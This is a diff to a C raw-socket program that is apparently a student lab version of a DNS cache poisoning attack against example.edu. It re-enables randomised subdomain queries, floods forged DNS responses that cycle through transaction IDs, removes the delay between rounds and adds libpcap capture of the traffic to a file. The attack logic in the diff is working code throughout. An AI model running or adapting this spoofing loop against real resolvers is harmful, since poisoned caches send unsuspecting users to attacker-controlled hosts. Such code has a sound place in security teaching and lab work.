@@ -24,6 +24,8 @@
 #include <errno.h>
 #include <stdlib.h>
 
+#include<pcap.h>
+
 // The packet length
 #define PCKT_LEN 8192
 #define FLAG_R 0x8400
@@ -309,15 +311,30 @@ int main(int argc, char *argv[])
 
     printf("buffer%s\n",buffer);
     printf("buffer res%s\n",buffer_res);
+
+    //------------start use tcpdump to get the packet --------------------
+    pcap_t *handle;
+    char errbuf[2048];
+    struct pcap_pkthdr header;
+    const u_char *packet;
+    handle = pcap_open_live("eth14", 2048, 1, 1000, errbuf);
+    if (handle == NULL) {
+        fprintf(stderr, "Couldn't open device %s: %s\n", "eth0", errbuf);
+        return 2;
+    }
+    pcap_dumper_t *dumpfile;
+    dumpfile = pcap_dump_open(handle, "capture.pcap");
+    
+
     int count, transID;
     while(1)
     {	
         // This is to generate a different query in xxxxx.example.edu
         //   NOTE: this will have to be updated to only include printable characters
-        //int charnumber;
-        //charnumber=1+rand()%5;
-        //*(data+charnumber)+=1;
-	//* (data_res + charnumber) +=1;
+        int charnumber;
+        charnumber=1+rand()%5;
+        *(data+charnumber)+=1;
+	* (data_res + charnumber) +=1;
 
         udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
 
@@ -326,21 +343,32 @@ int main(int argc, char *argv[])
             printf("packet send error %d which means %s\n",errno,strerror(errno));
     
         //Zilin start the response ppacket sending
-        sleep(1);
-        transID = 5000;
-        for(count=0; count<2000; count++){
+        //sleep(1);
+        transID = 3500;
+        for(count=0; count<1000; count++){
 	    //printf("start sending forged response packet, count is %d\n",count);
             dns_res -> query_id = transID + count;
             udp_res->udph_chksum=check_udp_sum(buffer_res, 
                 packetLength_res-sizeof(struct ipheader));
             if(sendto(sd_res, buffer_res, packetLength_res, 0, (struct sockaddr *)&sin_res, sizeof(sin_res)) < 0)
                 printf("packet send error %d which means %s\n",errno,strerror(errno));
+            
+            packet = pcap_next(handle, &header);
+            if (packet == NULL) {
+                printf("No packet found.\n");
+            } else {
+                pcap_dump((u_char *)dumpfile, &header, packet);
+            }
       
         }
+
     
     }
     close(sd);
     close(sd_res);
+    pcap_dump_close(dumpfile);
+    pcap_close(handle);
+
     return 0;
 }
 
